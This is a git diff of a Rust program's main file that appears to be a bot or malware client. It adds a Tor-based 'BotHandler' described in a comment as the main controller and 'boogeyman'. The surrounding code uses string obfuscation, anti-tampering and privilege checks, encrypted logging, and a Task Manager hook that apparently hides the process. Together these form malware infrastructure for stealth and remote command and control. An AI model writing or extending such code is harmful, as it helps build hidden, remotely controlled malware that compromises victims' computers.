@@ -2,16 +2,19 @@
 
 use std::sync::Mutex;
 use client_vars::constants::log_directory;
+use network::tor::BotHandler;
 use obfstr::obfstr as s;
 use shared::{
     constants::logs_encryption_key,
     logs::logger::Logger,
+    network::tor::LoggerConfig,
     uac::checks::is_system,
     utils::{ anti_tampering::is_clean, config::load_mib_config, functions::exit_1 },
 };
 use lazy_static::lazy_static;
-use utils::task_manager_hook::run_query_hooker;
+use tasks::task_manager_hook::run_query_hooker;
 
+mod tasks;
 mod utils;
 mod network;
 
@@ -126,6 +129,7 @@ async fn main() {
         let mut lock = LOGGER.lock().unwrap();
         *lock = Some(logger);
     }
+
     info!("Init");
 
     tokio::task::spawn(async move {
@@ -135,4 +139,11 @@ async fn main() {
             };
         }
     });
+    let config = LoggerConfig::Existing(LOGGER.lock().unwrap().clone());
+    if let Ok(mut bot_handler) = BotHandler::new(config).await {
+        bot_handler.run_handler().await;
+    };
 }
+
+// system info - a struct - where its loaded
+// it will be included in bot handler which is the main controller the main boogeyman thing
